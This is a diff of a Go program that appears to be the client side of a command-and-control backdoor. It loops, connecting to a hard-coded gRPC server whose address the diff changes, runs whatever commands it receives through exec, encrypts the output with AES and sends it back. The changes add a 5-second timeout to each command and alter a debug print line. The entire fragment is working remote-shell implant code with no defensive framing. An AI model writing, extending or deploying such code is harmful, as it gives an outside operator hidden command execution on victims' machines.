@@ -28,7 +28,7 @@ func main() {
 	for {
 		log.Println("开始上线")
 
-		if conn, err = grpc.Dial(fmt.Sprintf("172.16.130.160:%d", 1961), opts...); err != nil {
+		if conn, err = grpc.Dial(fmt.Sprintf("172.16.160.80:%d", 1961), opts...); err != nil {
 			log.Println("上线失败", err)
 			time.Sleep(10 * time.Second)
 			continue
@@ -110,10 +110,16 @@ func main() {
 			}
 			fmt.Println(tokens)
 			var c *exec.Cmd
+			baseCtx := context.Background()
+
+			// 设置超时时间为5秒
+			ctx, cancel := context.WithTimeout(baseCtx, 5*time.Second)
+			defer cancel()
+
 			if len(tokens) == 1 {
-				c = exec.Command(tokens[0])
+				c = exec.CommandContext(ctx, tokens[0])
 			} else {
-				c = exec.Command(tokens[0], tokens[1:]...)
+				c = exec.CommandContext(ctx, tokens[0], tokens[1:]...)
 			}
 			buf, err := c.CombinedOutput()
 			if err != nil {
@@ -125,7 +131,7 @@ func main() {
 			//将结果发送给服务端时先进行加密处理
 			cmd.Out += string(buf)
 			cmd.Out, _ = util.EncryptByAes([]byte(cmd.Out))
-			fmt.Println(cmd.In + cmd.Out)
+			fmt.Println("收:" + cmd.In + "\n 发出:" + cmd.Out)
 			client.SendOutput(ctx, cmd)
 		}
 	}
